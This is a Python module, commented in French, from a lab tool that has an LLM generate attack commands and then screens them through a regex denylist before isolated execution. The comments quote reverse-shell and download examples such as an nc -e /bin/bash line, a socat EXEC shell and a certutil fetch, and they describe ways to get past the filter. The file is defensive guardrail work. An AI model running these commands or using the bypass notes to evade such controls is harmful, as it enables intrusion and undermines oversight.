# Copyright (C) 2026 Mohamed Amine EDDARI <eddarimedamine@gmail.com>
# SPDX-License-Identifier: AGPL-3.0-or-later
# This file is part of CADRE. Full license text: LICENSE (repository root).

"""
CADRE — Découverte d'attaques autonome par IA (agent offensif encadré)
======================================================================

Boucle où l'assistant LLM **génère de nouvelles attaques par lui-même**,
CADRE les exécute dans le laboratoire isolé, vérifie qu'elles produisent
bien de la télémétrie, génère et valide leur règle Sigma, et n'ajoute au
catalogue personnel que celles qui **réussissent la validation TP/FP**.

SÉCURITÉ — quatre garde-fous, dans cet ordre (défense en profondeur) :

1. **Filtre anti-destruction** (`commande_dangereuse`) : AUCUNE commande
   générée par le LLM n'est exécutée si elle correspond à un motif
   destructeur (effacement, chiffrement, désactivation de sécurité, arrêt
   machine, exfiltration…). C'est une denylist stricte, appliquée AVANT
   toute exécution — le LLM propose, ce filtre dispose. Limite connue et
   assumée : une denylist regex ne détecte pas une commande délibérément
   obfusquée (ex. concaténation de chaînes `'Remove-Ite'+'m'`) -- c'est
   précisément pourquoi ce filtre n'est qu'UN des quatre garde-fous, pas le
   seul rempart.
2. **Isolation** : l'exécution passe par le pipeline normal, donc sur la VM
   cible en réseau host-only (aucun accès Internet, aucun débordement hors
   labo). CADRE ne s'adresse jamais à une autre cible.
3. **Barrière de validation** : une attaque n'est conservée que si elle
   déclenche vraiment une détection validée (TP/FP). Le LLM ne décide
   jamais seul qu'une attaque « compte ».
4. **Revue humaine** (optionnelle, `revue=True`) : le contenu validé n'est
   déployé dans Kibana qu'après qu'un humain l'ait vu et approuvé (`cadre
   revue approuver`) -- jamais un déploiement automatique sans regard
   humain sur une règle jamais éprouvée en conditions réelles avant ce
   cycle.

Cette conception est le point à défendre : un agent offensif IA autonome
n'est acceptable que fortement encadré. La puissance vient de l'autonomie,
la sûreté vient des garde-fous.
"""

from __future__ import annotations

import re
from typing import TYPE_CHECKING, Any

from .logger import obtenir_logger

if TYPE_CHECKING:
    from .orchestrateur import OrchestrateurCADRE

# Motifs de commandes DESTRUCTRICES ou hors-cadre. Toute correspondance
# (insensible à la casse) fait rejeter la commande avant exécution. Volontai-
# rement large : en cas de doute, on refuse. Le catalogue natif de CADRE est
# lui écrit à la main et audité — ces règles ne visent QUE les commandes
# générées à la volée par le LLM.
_MOTIFS_DANGEREUX: tuple[str, ...] = (
    # Effacement / destruction de fichiers
    # Régression (audit) : `-[rf]` n'exigeait `r`/`f` qu'en PREMIÈRE position
    # du groupe de flags courts -- une commande parfaitement ordinaire comme
    # `rm -vrf` (verbose+recursif+force), `rm -ir`, `rm -dR` ou `rm -Ivr`
    # (r/f présent mais pas en tête du cluster) passait au travers, sans
    # aucune obfuscation : coreutils autorise n'importe quel ordre dans un
    # groupe de flags courts. `[a-z]*` de part et d'autre de `[rf]` couvre
    # tout ordre/toute combinaison, tant que r/f/R/F apparaît QUELQUE PART
    # dans le cluster (aucun flag rm légitime autre que r/R/f ne contient
    # ces lettres -- i/I/d/v -- donc aucun nouveau faux positif introduit,
    # vérifié contre `rm -v`/`rm -i` seuls, qui restent acceptés).
    r"\brm\s+-[a-z]*[rf][a-z]*\b",
    r"\brm\b.*--(recursive|force)",  # flags longs GNU (coreutils, cible Kali)
    # `find ... -delete` (et `-exec rm ...`) : suppression de masse récursive
    # par construction (find descend l'arborescence), jamais nécessaire pour
    # une découverte en lecture seule -- aucun motif rm ci-dessus ne le
    # couvre puisque `find` n'est pas `rm`.
    r"\bfind\b.*-delete\b",
    r"\bfind\b.*-exec\s+rm\b",
    # Remove-Item ET ses alias PowerShell natifs (ri/rd/del/erase/rmdir sont
    # TOUS des alias de Remove-Item par défaut -- vérifié : `Get-Alias
    # -Definition Remove-Item`) -- BLOQUÉ SANS CONDITION DE FLAG. Une version
    # antérieure n'exigeait ce motif qu'avec `-recurse` explicite (et
    # `del`/`rmdir` cmd.exe seulement avec /f/s/q) : contournable par le
    # flag court `-r`, par l'ordre inverse (`Get-ChildItem -Recurse | Remove-
    # Item -Force`, où `-recurse` précède l'alias au lieu de le suivre), et
    # laissait carrément passer une suppression non récursive d'un fichier
    # unique (`Remove-Item x -Force`, tout aussi destructrice pour ce
    # fichier précis). Aucune découverte légitime (recon en lecture seule)
    # n'a besoin d'invoquer Remove-Item/del/rmdir sous quelque forme que ce
    # soit -- bloquer sans condition élimine toute la famille de variantes
    # de flags/ordre en un seul motif, au lieu de courir après chacune.
    r"\b(remove-item|ri|rd|del|erase|rmdir)\b",
    # "format" comme mot isolé (formatage disque, "format C: /y") ou suivi
    # d'un cmdlet PowerShell tout aussi destructeur (Format-Volume, Format-
    # Disk) -- mais PAS les cmdlets de mise en forme de SORTIE, totalement
    # inoffensifs et très courants en recon (Format-Table/-List/-Wide/
    # -Custom, ex. `Get-Process | Format-Table`), que `\bformat\b` seul
    # bloquait à tort (faux positif qui aurait fait refuser une bonne part
    # des découvertes IA légitimes sans qu'aucune raison n'y paraisse).
    r"\bformat\b(?!-(?:table|list|wide|custom))",
    r"cipher\s+/w",
    r"\bsdelete\b",
    # Commande encodée en Base64 (`-EncodedCommand`/ses abréviations
    # `-en`/`-enc`/...) : le payload réel n'apparaît alors jamais en clair
    # dans la commande soumise à CE filtre, le contournant structurellement.
    # `-en` est un préfixe sûr : c'est le plus court possible pour
    # powershell.exe (aucun autre commutateur de l'hôte ne commence par
    # "-en" -- -ExecutionPolicy commence par "-ex", pas d'ambiguïté).
    # Aucune découverte légitime n'a besoin d'une commande encodée.
    r"-en\w*",
    # Destruction de sauvegardes / récupération
    r"vssadmin\s+delete",
    r"wbadmin\s+delete",
    r"\bdiskpart\b",
    r"bcdedit\b.*(delete|/set)",
    r"wevtutil\s+cl",  # effacement de journaux (anti-forensic)
    r"clear-eventlog",
    # Arrêt / redémarrage machine
    r"\bshutdown\b",
    r"restart-computer",
    r"stop-computer",
    # Désactivation des protections
    r"set-mppreference\b.*-disable",
    r"netsh\s+advfirewall\s+set.*\boff\b",
    r"set-netfirewallprofile\b.*-enabled\s+false",  # équivalent PowerShell moderne
    r"disable-windowsoptionalfeature",
    # Régression (audit) : toute une famille de désactivation d'EDR/AV/audit
    # passait intégralement le filtre alors que le docstring du module
    # promet explicitement de bloquer la « désactivation de sécurité » --
    # vérifié par exécution directe avant ce correctif : Stop-Service
    # WinDefend, net stop WinDefend, sc stop/delete/config ... disabled,
    # Add-MpPreference -ExclusionPath (exclusion antivirus, technique
    # d'évasion courante) et auditpol /clear ou /set .../success:disable
    # (désactivation de la journalisation d'audit) étaient tous acceptés
    # (None). `stop-service`/`net stop` n'apparaissent dans aucune commande
    # de recon légitime (Get-Service/tasklist restent acceptés, aucun
    # chevauchement de motif).
    r"stop-service\b",
    r"\bnet\s+stop\b",
    r"\bsc\b\s+(stop|delete)\b",
    r"\bsc\b\s+config\b.*\bdisabled?\b",
    # Processus EDR/AV connus (Defender + SentinelOne, les deux produits
    # mentionnés dans ce projet) tués pour neutraliser la détection.
    # `sentinel\w*` (pas un nom exact) : SentinelOne expose plusieurs
    # processus (SentinelAgent, SentinelServiceHost, SentinelStaticEngine,
    # SentinelHelperService...) -- un nom exact unique aurait laissé passer
    # les autres, vérifié par échec réel d'un test avant cette généralisation.
    r"taskkill\b.*(msmpeng|sentinel\w*|cbdaemon)",
    # Régression (audit, revue indépendante) : variantes PowerShell directes
    # de la même famille, non couvertes par les motifs ci-dessus -- vérifié
    # acceptées (None) avant ce correctif. `Stop-Process` tue le PROCESSUS
    # (cmdlet distincte de `Stop-Service`, même résultat sur un EDR/AV) ;
    # `Add-MpPreference` accepte aussi des exclusions par nom de processus
    # ou extension, pas seulement par chemin ; `auditpol /remove` retire une
    # catégorie d'audit (équivalent fonctionnel de `/clear`/`/set
    # .../disable`, motif distinct).
    r"stop-process\b.*(msmpeng|sentinel\w*|cbdaemon)",
    r"add-mppreference\b.*-exclusion(path|process|extension)",
    r"auditpol\b.*(clear|disable|remove)",
    # Comptes / privilèges destructeurs
    r"/delete\b",
    r"remove-localuser",
    r"net\s+user\b.*/del",
    # Registre : suppression de ruches sensibles
    r"reg\s+delete\s+hk(lm|cr)",
    # Téléchargement + exécution (dropper)
    r"(iwr|invoke-webrequest|curl|wget)\b.*\|\s*(iex|invoke-expression)",
    r"downloadstring\b.*iex",
    r"certutil\b.*-urlcache.*-f",
    # Exfiltration réseau explicite / scan de masse
    r"\bnmap\b",
    # Régression (audit) : `\bnc\b\s+-` n'exigeait le flag `-` que JUSTE
    # APRÈS `nc` -- la syntaxe de reverse-shell la plus courante en pratique
    # (`nc <cible> <port> -e /bin/sh`, flag EN FIN de commande) passait au
    # travers sans aucune obfuscation. Vérifié par exécution directe avant
    # ce correctif : `nc target.example.com 4444 -e /bin/bash` était
    # accepté (None). Le flag `-` n'importe où après `nc` couvre les deux
    # ordres, sans introduire de faux positif (aucune découverte légitime
    # n'invoque `nc` sans arguments).
    r"\bnc\b.*-",  # netcat
    # Régression (audit, revue indépendante) : `\bnc\b` (frontière de mot)
    # ne matche jamais "ncat" (même famille nmap, capacités identiques à
    # netcat, souvent présent sur Kali) ni "socat" -- vérifiés acceptés
    # (None) avant ce correctif, y compris `socat TCP:host:port
    # EXEC:/bin/bash`, une reverse shell SANS aucun flag `-`, que le motif
    # `nc` ci-dessus (qui exige un `-`) n'aurait de toute façon pas couverte.
    # Bloqués sans condition, comme `nmap` ci-dessus : aucune découverte
    # légitime n'invoque ces deux outils.
    r"\b(ncat|socat)\b",
    # Reverse shell bash via redirection de descripteur de fichier réseau --
    # famille distincte de `nc`/`ncat`/`socat`, aucun rapport avec un motif
    # existant.
    r"/dev/tcp/",
    # Ransomware / chiffrement de masse
    r"encrypt.*-recurse",
)


# Régression (audit) : sans re.DOTALL, `.` ne franchit JAMAIS un saut de
# ligne -- tout motif à deux membres (mot-clé ... modificateur, ex.
# `certutil.*-urlcache.*-f`, `\brm\b.*--force`, `\bfind\b.*-delete\b`,
# `netsh ... set.*off`) est contournable en insérant un simple `\n` entre
# les deux, ce qui reste une commande PARFAITEMENT valide et destructrice :
# continuation de ligne PowerShell (backtick en fin de ligne) ou shell
# (`\` en fin de ligne), ou simplement un script multi-lignes tel que ceux
# qu'Atomic Red Team ou un LLM produisent couramment. Aucune obfuscation
# requise -- vérifié par compilation réelle du filtre avant ce correctif :
# `certutil -urlcache -split \`\n-f http://x/m.exe m.exe` était accepté
# (None) alors que la forme mono-ligne équivalente était bien refusée.
# DOTALL fait de `.` un "n'importe quel caractère y compris \n" partout
# dans ce filtre -- cohérent avec la doctrine du module : en cas de doute,
# on refuse.
_REGEX_DANGEREUX = re.compile("|".join(_MOTIFS_DANGEREUX), re.IGNORECASE | re.DOTALL)


def commande_dangereuse(commande: str) -> str | None:
    """
    Retourne le motif dangereux détecté (chaîne) si la commande doit être
    REFUSÉE, sinon None. Garde-fou n°1 : appliqué avant toute exécution
    d'une commande générée par le LLM.
    """
    if not commande or not commande.strip():
        return "commande vide"
    m = _REGEX_DANGEREUX.search(commande)
    return m.group(0) if m else None


def _prochain_id_perso(prefixe: str = "CADRE-IA") -> str:
    """Identifiant unique pour une attaque découverte par l'IA (CADRE-IA-001…)."""
    from .catalogue_attaques import CATALOGUE  # noqa: PLC0415
    from .catalogue_utilisateur import charger_attaques_utilisateur  # noqa: PLC0415

    existants = {a.id for a in CATALOGUE} | {a.id for a in charger_attaques_utilisateur()}
    i = 1
    while f"{prefixe}-{i:03d}" in existants:
        i += 1
    return f"{prefixe}-{i:03d}"


def decouvrir_attaques(
    orchestrateur: OrchestrateurCADRE,
    descriptions: list[str],
    techniques: list[str] | None = None,
    revue: bool = False,
) -> dict[str, Any]:
    """
    Agent de découverte autonome : pour chaque description, le LLM génère une
    attaque, on la passe par les trois garde-fous (filtre → exécution isolée
    → validation), et on ne conserve que les attaques VALIDÉES.

    Args:
        orchestrateur: instance configurée (fournit VM/SIEM et le pipeline).
        descriptions: intentions en langage naturel à faire modéliser par
            l'IA (ex. "lister les tâches planifiées", "énumérer les partages").
        techniques: technique MITRE imposée par description (optionnel, aligné
            sur `descriptions` par index).
        revue: si True (défaut False, comportement inchangé), une attaque
            validée n'est PAS déployée automatiquement dans Kibana -- elle
            rejoint la file de revue humaine (`cadre revue lister`) à la
            place. Le 4e garde-fou : contenu jamais éprouvé, jamais déployé
            sans qu'un humain l'ait vu.

    Returns:
        {"decouvertes": [...], "refusees": [...], "echecs": [...]} — chaque
        entrée résume l'attaque et son sort.
    """
    from .assistant_llm import obtenir_assistant_llm  # noqa: PLC0415
    from .catalogue_utilisateur import (  # noqa: PLC0415
        ErreurCatalogueUtilisateur,
        brouillon_vers_attaque,
        enregistrer_attaque_utilisateur,
    )
    from .orchestrateur import (  # noqa: PLC0415
        _acquerir_verrou_cycle,
        _liberer_verrou_cycle,
    )

    log = obtenir_logger()
    assistant = obtenir_assistant_llm()
    decouvertes: list[dict[str, Any]] = []
    refusees: list[dict[str, Any]] = []
    echecs: list[dict[str, Any]] = []

    # F-009 : cette fonction est TOUJOURS réelle (jamais de mode simulation,
    # voir docstring du module) et appelle executer_attaque_complete()
    # directement -- sans jamais passer par executer_cycle_complet(), donc
    # sans jamais acquérir le verrou inter-processus qui évite qu'un
    # `cadre decouvrir` (ou le thread d'arrière-plan du dashboard qui
    # l'appelle) et un autre cycle réel ne tournent en même temps contre la
    # même cible. Acquis une seule fois pour tout le lot de descriptions.
    _acquerir_verrou_cycle()
    try:
        for i, description in enumerate(descriptions):
            technique = techniques[i] if techniques and i < len(techniques) else None
            log.info(f"IA génère une attaque : {description}", technique=technique)

            brouillon = assistant.suggerer_attaque(description, technique_mitre=technique)
            if brouillon is None:
                echecs.append(
                    {
                        "description": description,
                        "raison": "IA injoignable ou réponse illisible (voir journaux)",
                    }
                )
                continue
            if not brouillon.get("commande"):
                echecs.append(
                    {
                        "description": description,
                        "raison": (
                            "l'IA n'a proposé aucune commande exploitable "
                            "(probable refus ou description trop vague)"
                        ),
                    }
                )
                continue

            commande = brouillon["commande"]

            # --- Garde-fou n°1 : filtre anti-destruction (AVANT exécution) --
            motif = commande_dangereuse(commande)
            if motif:
                log.warn(f"Attaque IA REFUSÉE (commande dangereuse : {motif!r})", commande=commande)
                refusees.append(
                    {"description": description, "commande": commande, "motif_refus": motif}
                )
                continue

            # Attribuer un id propre et valider la structure du brouillon.
            brouillon["id"] = _prochain_id_perso()
            try:
                attaque = brouillon_vers_attaque(brouillon)
            except ErreurCatalogueUtilisateur as e:
                echecs.append({"description": description, "raison": f"brouillon invalide : {e}"})
                continue

            # --- Garde-fous n°2 (isolation) et n°3 (validation) : le pipeline
            # normal exécute sur la VM host-only et ne valide qu'après TP/FP.
            # Garde-fou n°4 (revue) : si `revue=True`, s'arrête juste après la
            # validation TP/FP, avant tout déploiement Kibana (voir
            # `executer_attaque_complete`, `arreter_avant_deploiement`).
            resultat = orchestrateur.executer_attaque_complete(
                attaque, arreter_avant_deploiement=revue, source_revue="decouvrir"
            )
            statut = resultat.get("statut")

            if statut in ("VALIDE", "VALIDE_NON_DEPLOYE", "EN_ATTENTE_REVUE"):
                try:
                    enregistrer_attaque_utilisateur({**brouillon})
                    log.success(f"Attaque IA découverte et ajoutée : {attaque.id} ({attaque.nom})")
                    entree_decouverte = {
                        "id": attaque.id,
                        "nom": attaque.nom,
                        "technique_mitre": attaque.technique_mitre,
                        "commande": commande,
                        "statut": statut,
                    }
                    if statut == "EN_ATTENTE_REVUE":
                        entree_decouverte["rule_id_stable"] = resultat.get("rule_id_stable")
                    decouvertes.append(entree_decouverte)
                except ErreurCatalogueUtilisateur as e:
                    echecs.append({"description": description, "raison": f"enregistrement : {e}"})
            else:
                echecs.append(
                    {
                        "description": description,
                        "id": attaque.id,
                        "commande": commande,
                        "raison": f"non validée ({statut}: {resultat.get('raison', '')})",
                    }
                )
    finally:
        _liberer_verrou_cycle()

    return {"decouvertes": decouvertes, "refusees": refusees, "echecs": echecs}
